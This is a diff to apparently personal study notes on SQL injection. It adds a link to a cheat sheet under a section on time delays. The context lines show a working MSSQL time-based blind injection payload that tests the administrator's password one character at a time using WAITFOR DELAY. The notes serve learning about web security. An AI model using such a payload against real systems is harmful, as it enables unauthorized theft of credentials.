@@ -16,9 +16,11 @@ example: "Error: invalid input syntax for type integer: 'example data'"
 
 Method 3: Triggerin time delays
 
-----------------------------------------------------------------------------
+-------------#############################################------------------
 
 Injection query=>'; IF (SELECT COUNT(username) FROM users where username='administrator' AND SUBSTRING(password,1,1)>'m')=1 WAITFOR DELAY '0:0:10'--
+
+Conditional Time delays: https://portswigger.net/web-security/sql-injection/cheat-sheet
 
 ----------Above command will delays the response to 10 seconds.-------------
 
